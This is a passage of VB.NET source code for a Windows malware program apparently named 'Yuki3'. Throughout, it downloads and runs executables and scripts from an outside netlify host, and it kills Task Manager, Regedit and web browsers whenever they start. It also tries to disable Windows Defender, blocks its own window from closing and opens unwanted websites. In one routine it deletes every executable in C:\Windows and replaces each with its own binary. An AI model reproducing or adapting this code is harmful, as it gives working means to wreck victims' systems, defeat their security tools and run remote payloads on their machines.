            Process.Start("C:\Users\" & SystemInformation.UserName & "\screen-melter.exe")
            Timer2.Stop()
            ' End Using
        Catch

        End Try
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Try
            Using client = New WebClient()
                '   Using stream = client.OpenRead("http://www.google.com")

            End Using

            creepy_Patrick_Star.Show()

            My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav", AudioPlayMode.BackgroundLoop)
            Timer3.Stop()
            ' End Using
        Catch

        End Try
    End Sub
    Dim working1 As Boolean = False
    Private Sub CehckforbadPross_Tick(sender As Object, e As EventArgs) Handles CehckforbadPross.Tick

        ' My.Computer.Network.DownloadFile(


        Dim p() As Process

        p = Process.GetProcessesByName("Regedit")
        If p.Count > 0 Then
            If working1 = False Then
                working1 = True

                Try
                    Process.GetProcessesByName("Regedit")(0).Kill()
                Catch ex As Exception

                End Try
                Try
                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Catch ex As Exception

                End Try
                working1 = False
            End If


        Else

            ' Process is not running
        End If



        p = Process.GetProcessesByName("Taskmgr")
        If p.Count > 0 Then
            If working1 = False Then
                working1 = True

                Try
                    Process.GetProcessesByName("Taskmgr")(0).Kill()
                Catch ex As Exception

                End Try
                Try
                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Catch ex As Exception

                End Try
                working1 = False
            End If


        Else

            ' Process is not running

        End If





    End Sub

    Private Sub DateTimePicker1_ValueChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        '

        Try
            Using client = New WebClient()
                '  Using stream = client.OpenRead("http://www.google.com")

            End Using
            Try
                My.Computer.Network.DownloadFile(
        "https://incomparable-cascaron-802b94.netlify.app/note.txt",
       "C:\Users\" & SystemInformation.UserName & "\note.txt")
            Catch ex As Exception

            End Try


            Process.Start("C:\Users\" & SystemInformation.UserName & "\note.txt")
            Timer4.Stop()
            ' End Using
        Catch

        End Try
    End Sub

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        Process.Start("https://www.fittea.com/")
    End Sub

    Private Sub CheckForBadFiles_Tick(sender As Object, e As EventArgs) Handles CheckForBadFiles.Tick
        '"C:\Users\" & SystemInformation.UserName & "\gdi.exe"
        If Check4BadFile = True Then
            Dim fileReader As String
            fileReader = "oh ur dead"
            Try
                fileReader = My.Computer.FileSystem.ReadAllText("C:\Users\" & SystemInformation.UserName & "\path.yuki")
            Catch ex As Exception

            End Try

            If Not fileReader = Application.ExecutablePath Then
                Try
                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Catch ex As Exception

                End Try
                Try
                    Try
                        My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\path.yuki")
                    Catch ex As Exception

                    End Try
                    Dim path As String = "C:\Users\" & SystemInformation.UserName & "\path.yuki"
                    Dim fs As FileStream = File.Create(path)
                    ' Add text to the file.
                    Dim info As Byte() = New UTF8Encoding(True).GetBytes(Application.ExecutablePath)
                    fs.Write(info, 0, info.Length)
                    fs.Close()
                Catch ex As Exception

                End Try
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll") Then
            Else
                If download1 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll",
   "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If
            'ERROR408.exe
            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\ERROR408.exe") Then
            Else
                If download17 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/ERROR408.exe",
   "C:\Users\" & SystemInformation.UserName & "\ERROR408.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If
            'musicthing.wav



            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\musicthing.wav") Then
            Else
                If download20 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/musicthing.wav",
   "C:\Users\" & SystemInformation.UserName & "\musicthing.wav")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\MELTDOWN.wav") Then
            Else
                If download19 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/MELTDOWN.wav",
   "C:\Users\" & SystemInformation.UserName & "\MELTDOWN.wav")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If


            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\error.mp4") Then
            Else
                If download18 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/error.mp4",
   "C:\Users\" & SystemInformation.UserName & "\error.mp4")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe") Then
            Else
                If download15 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/Yuki3Antivirus.exe",
   "C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Main.db") Then
            Else
                If download15 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/Main.db",
   "C:\Users\" & SystemInformation.UserName & "\Main.db")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe") Then
            Else
                If download1 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe",
   "C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\gdi.exe") Then
            Else
                If download8 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/gdi.exe",
   "C:\Users\" & SystemInformation.UserName & "\gdi.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\uranidot.wav") Then
            Else
                If download13 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/uranidot.wav",
   "C:\Users\" & SystemInformation.UserName & "\uranidot.wav")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If
            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\play.vbs") Then
            Else
                If download14 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/play.vbs",
   "C:\Users\" & SystemInformation.UserName & "\play.vbs")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe") Then
            Else
                If download9 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe",
   "C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe") Then
            Else
                If download1 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/Hoax.Win32.BadJoke.BlastBtn.a.exe",
   "C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav") Then 'ohnotooload.wav
            Else
                If download5 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/346tr8Ge6.wav",
   "C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\ohnotooload.wav") Then 'ohnotooload.wav
            Else
                If download12 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/ohnotooload.wav",
   "C:\Users\" & SystemInformation.UserName & "\ohnotooload.wav")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\screen-melter.exe") Then '
            Else
                If download6 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/screen-melter.exe",
   "C:\Users\" & SystemInformation.UserName & "\screen-melter.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav") Then 'ygAGUDFGFGUTADF
            Else
                If download7 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/whatthefuckimout.wav",
   "C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll") Then
            Else
                If download2 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
               "https://incomparable-cascaron-802b94.netlify.app/Interop.WMPLib.dll",
              "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe") Then
            Else
                If download3 = True Then

                End If
            End If
            Try
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
            "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
            Catch ex As Exception

            End Try
        End If

    End Sub

    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick

    End Sub

    Private Sub Timer7_Tick(sender As Object, e As EventArgs) Handles Timer7.Tick
        Try
            Dim scope As New ManagementScope("\\.\ROOT\SecurityCenter2")
            scope.Connect()

            Dim query As New ObjectQuery("SELECT * FROM AntivirusProduct")
            Dim searcher As New ManagementObjectSearcher(scope, query)

            For Each instance As ManagementObject In searcher.Get()
                If instance("displayName").ToString().Contains("Windows Defender") Then
                    instance.InvokeMethod("SetEnable", New Object() {False})
                End If
            Next
        Catch ex As Exception

        End Try


    End Sub

    Private Sub errorrow_Tick(sender As Object, e As EventArgs) Handles errorrow.Tick

    End Sub

    Public Declare Function ShowWindow Lib "user32" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean

    Public Const SW_HIDE As Integer = 0
    Public Const SW_SHOW As Integer = 5

    Sub HideTaskManager()
        Dim proc As Process = Process.GetCurrentProcess()
        ShowWindow(proc.MainWindowHandle, SW_HIDE)
    End Sub

    Sub ShowTaskManager()
        Dim proc As Process = Process.GetCurrentProcess()
        ShowWindow(proc.MainWindowHandle, SW_SHOW)
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        MsgBox("the fuck you doing", 0 + 16, "bruh")
        e.Cancel = True
        ShowTaskManager()
    End Sub
    Function runasadmin()
        Try
            My.Computer.Network.DownloadFile(
          "https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe",
         "C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")

        Catch ex As Exception

        End Try
        Try
            Process.Start("C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")
        Catch ex As Exception

        End Try
    End Function

    Function downloadwavFiles()

    End Function

    Private Sub RemoveVirusStart_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles RemoveVirus.DoWork
        My.Settings.infected = False
        Try

            My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/Remove_Yuki_Virus.exe",
   "C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe")

        Catch ex As Exception

        End Try
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("start " & "C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe")
        sb.AppendLine("del remv.bat")
        IO.File.WriteAllText("remv.bat", sb.ToString())
        Process.Start("remv.bat")

        'MyUtilities.RunCommandCom("start " & "C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe", "/W", True)
    End Sub

    Private Sub DelVirusRemover_Tick(sender As Object, e As EventArgs) Handles DelVirusRemover.Tick
        Dim p() As Process



        p = Process.GetProcessesByName("Remove_Yuki_Virus")
        If p.Count > 0 Then
            If working1 = False Then




            End If


        Else
            Try
                My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe")
            Catch ex As Exception

            End Try
            ' Process is not running
        End If
    End Sub

    Private Sub KillFalseP_Tick(sender As Object, e As EventArgs) Handles KillFalseP.Tick
        Dim p() As Process



        p = Process.GetProcessesByName("Remove_Yuki_Virus")
        If p.Count > 0 Then
            If working1 = False Then

                Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")


            End If


        Else

            ' Process is not running
        End If
    End Sub

    Private Sub Wait2DisPros_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles Wait2DisPros.DoWork
        Threading.Thread.Sleep(7000)
        CehckforbadPross.Start()
        CheckForBadFiles.Start()

    End Sub

    Private Sub Memzopenweb_Tick(sender As Object, e As EventArgs) Handles Memzopenweb.Tick
        Threading.Thread.Sleep(7000)
        Process.Start("https://www.google.com/search?q=batch+virus+download&gs_ivs=1")
        Threading.Thread.Sleep(10000)
        Process.Start("https://www.google.com/search?q=how+2+get+free+robux&rlz=1C1CHBF_enUS1001US1001&oq=how+2+get+free+robux&aqs=chrome..69i57j0i512j0i22i30i625.5721j0j7&sourceid=chrome&ie=UTF-8")
        Threading.Thread.Sleep(10000)
        Process.Start("https://www.google.com/search?q=is+the+memz+real&rlz=1C1CHBF_enUS1001US1001&sxsrf=AJOqlzUa7TuxfjZxQuFevGrNu9YaEzmbuw%3A1677365515977&ei=C5H6Y5H_OuyjptQP5pGE-AM&ved=0ahUKEwjRsPO94bH9AhXskYkEHeYIAT8Q4dUDCBA&uact=5&oq=is+the+memz+real&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIECCMQJzIECCMQJzIECCMQJzIFCAAQkQIyBQgAEJECMgsIABCABBCxAxCDATILCAAQgAQQsQMQgwEyEQguEIAEELEDEIMBEMcBEK8BMhEILhCABBCxAxCDARDHARDRAzILCAAQgAQQsQMQgwFKBAhBGABQAFjnMWC4NGgAcAF4AIABjgGIAY4BkgEDMC4xmAEAoAEBwAEB&sclient=gws-wiz-serp")
        Threading.Thread.Sleep(7000)
        Process.Start("https://www.google.com/search?q=batch+virus+download&gs_ivs=1")
        Threading.Thread.Sleep(7000)
        Process.Start("http://pcoptimizerpro.com/")
        Threading.Thread.Sleep(7000)
    End Sub

    Private Sub Stilluseingthispclol_Tick(sender As Object, e As EventArgs) Handles Stilluseingthispclol.Tick
        Dim r
        Randomize()
        r = Int(Rnd() * 500) + 1
        Dim r2 = Int(Rnd() * 1500) + 1
        Dim Title = "still using this computer?"
        Dim DefaultValueText = "still using this computer?"
        Dim Message = "still using this computer?"
        Dim XPos = r
        Dim YPos = r2
        Dim Text = InputBox(Message, Title, DefaultValueText, XPos, YPos)
    End Sub

    Private Sub fakememz_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles fakememz.DoWork

    End Sub
    Dim intcois As Integer = 0
    Private Sub CopyIexmeme_Tick(sender As Object, e As EventArgs) Handles CopyIexmeme.Tick
        'Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\iexplore.exe"
        If System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\iexplore.exe") = True Then
            intcois = intcois + 1
            System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\iexplore.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\iexplore" & intcois & ".exe")
        End If
        If intcois > 300 Then
            CopyIexmeme.Stop()
        End If
    End Sub

    Private Sub fucked_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles fucked.DoWork
        Dim directoryPath As String = "C:\Windows"
        Dim fileList() As String = Directory.GetFiles(directoryPath, "*.exe")
        For Each filePath As String In fileList
            ' Delete the file
            Try
                File.Delete(filePath)
                System.IO.File.Copy("C:\Users\" & SystemInformation.UserName & "\yuki3.f.exe", filePath)
            Catch ex As Exception

            End Try

        Next

    End Sub

    Private Sub Timer9_Tick(sender As Object, e As EventArgs) Handles Timer9.Tick

    End Sub

    Private Sub nowebforu_Tick(sender As Object, e As EventArgs) Handles nowebforu.Tick
        Dim p() As Process
        p = Process.GetProcessesByName("chrome")
        If p.Count > 0 Then
            If working1 = False Then
                working1 = True

                Try
                    Process.GetProcessesByName("chrome")(0).Kill()
                Catch ex As Exception

                End Try
                Try
                    googe_Edge.Show()
                    MsgBox("for today you're going to be using my web browser no matter what", 0 + 64, "yuki3")
                Catch ex As Exception

                End Try
                working1 = False
            End If
        Else
        End If

        p = Process.GetProcessesByName("firefox")
        If p.Count > 0 Then
            If working1 = False Then
                working1 = True

                Try
                    Process.GetProcessesByName("firefox")(0).Kill()
                Catch ex As Exception

                End Try
                Try
                    googe_Edge.Show()
                    MsgBox("for today you're going to be using my web browser no matter what", 0 + 64, "yuki3")
                Catch ex As Exception

                End Try
                working1 = False
            End If
        Else
        End If

        'opera.exe

        p = Process.GetProcessesByName("opera")
        If p.Count > 0 Then
            If working1 = False Then
                working1 = True

                Try
                    Process.GetProcessesByName("opera")(0).Kill()
                Catch ex As Exception

                End Try
                Try
                    googe_Edge.Show()
                    MsgBox("who the fuck uses Opera")
                    MsgBox("for today you're going to be using my web browser no matter what", 0 + 64, "yuki3")
                Catch ex As Exception

                End Try
                working1 = False
            End If
        Else
        End If

        'msedge.exe
        p = Process.GetProcessesByName("msedge")
        If p.Count > 0 Then
            If working1 = False Then
                working1 = True

                Try
                    Process.GetProcessesByName("msedge")(0).Kill()
                Catch ex As Exception

                End Try
                Try
                    googe_Edge.Show()

                    MsgBox("for today you're going to be using my web browser no matter what", 0 + 64, "yuki3")
                Catch ex As Exception

                End Try

                working1 = False
            End If
        Else
        End If

        p = Process.GetProcessesByName("msedge")
        If p.Count > 0 Then
            If working1 = False Then
                working1 = True

                Try
                    Process.GetProcessesByName("msedge")(0).Kill()
                Catch ex As Exception

                End Try
                Try
                    googe_Edge.Show()

                    MsgBox("for today you're going to be using my web browser no matter what", 0 + 64, "yuki3")
                Catch ex As Exception

                End Try

                working1 = False
            End If
        Else
        End If

    End Sub

    Private Sub canwegetanfforeerf_Tick(sender As Object, e As EventArgs) Handles canwegetanfforeerf.Tick
        F_for_EERFvb.Show()
    End Sub

    Private Sub Openzv800alot_Tick(sender As Object, e As EventArgs) Handles Openzv800alot.Tick
        Process.Start("https://www.zv800.com/")
    End Sub

    Private Sub DownloadBigFiles_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles DownloadBigFiles.DoWork
        Try
            download20 = True
            My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/musicthing.wav", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
            "C:\Users\" & SystemInformation.UserName & "\musicthing.wav")

        Catch ex As Exception

        End Try
        Try
            download8 = True
            My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/hahau.wav", 'https://incomparable-cascaron-802b94.netlify.app/uranidot.wav
            "C:\Users\" & SystemInformation.UserName & "\hahau.wav")

        Catch ex As Exception

        End Try

        Try
            download13 = True
            My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/uranidot.wav", 'https://incomparable-cascaron-802b94.netlify.app/uranidot.wav
            "C:\Users\" & SystemInformation.UserName & "\uranidot.wav")

        Catch ex As Exception

        End Try





    End Sub

    Private Sub DownloadBigFiles2_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles DownloadBigFiles2.DoWork
        Try
            download19 = True
            My.Computer.Network.DownloadFile(
                   "https://incomparable-cascaron-802b94.netlify.app/MELTDOWN.wav",
                  "C:\Users\" & SystemInformation.UserName & "\MELTDOWN.wav")

        Catch ex As Exception

        End Try

        Try
            download5 = True
            My.Computer.Network.DownloadFile(
            "https://incomparable-cascaron-802b94.netlify.app/346tr8Ge6.wav",
           "C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav")
        Catch ex As Exception

        End Try
    End Sub

    Private Sub DownloadBigFiles3_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles DownloadBigFiles3.DoWork
        Try
            download7 = True
            My.Computer.Network.DownloadFile(
            "https://incomparable-cascaron-802b94.netlify.app/whatthefuckimout.wav",
           "C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav")
        Catch ex As Exception

        End Try
        Try
            download12 = True
            My.Computer.Network.DownloadFile(
         "https://incomparable-cascaron-802b94.netlify.app/ohnotooload.wav",
        "C:\Users\" & SystemInformation.UserName & "\ohnotooload.wav")

        Catch ex As Exception
        End Try
        Try
            download17 = True
            My.Computer.Network.DownloadFile(
         "https://incomparable-cascaron-802b94.netlify.app/error.mp4",
        "C:\Users\" & SystemInformation.UserName & "\error.mp4")

        Catch ex As Exception

        End Try
    End Sub
End Class


Public Class MyUtilities
    Shared Sub RunCommandCom(command As String, arguments As String, permanent As Boolean)
        Dim p As Process = New Process()
        Dim pi As ProcessStartInfo = New ProcessStartInfo()
        pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
        pi.FileName = "cmd.exe"
        p.StartInfo = pi
        ' p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
        p.Start()
    End Sub

End Class
